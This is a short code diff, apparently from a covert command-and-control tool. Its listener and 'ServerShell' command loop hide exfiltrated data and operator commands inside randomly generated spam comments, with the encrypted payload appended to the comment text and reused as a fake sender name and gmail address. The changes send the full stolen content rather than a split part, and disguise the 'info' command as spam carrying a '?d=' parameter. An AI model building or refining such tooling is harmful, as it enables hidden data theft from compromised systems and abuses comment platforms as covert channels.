@@ -57,7 +57,7 @@ def thread_start_listener():
 
             comment = Comment()
             comment.sender = Sender()
-            name_to_use = exfil_content.split(":")[0]
+            name_to_use = exfil_content
             comment.comment = generate_random_spam_comment(0) + encrypt_decript_string(name_to_use)
             comment.sender.name = name_to_use
             comment.sender.email = name_to_use.lower() + "@gmail.com"
@@ -79,7 +79,7 @@ class ServerShell(cmd.Cmd):
         comment = Comment()
         comment.sender = sender
         comment.comment_id = generate_random_string(10)
-        comment.comment = comment.comment_id + ": Info"
+        comment.comment = generate_random_spam_comment() + "?d=" + "info"
         send_data(channel, comment, mtb_send_config)
 
 ServerShell().cmdloop()
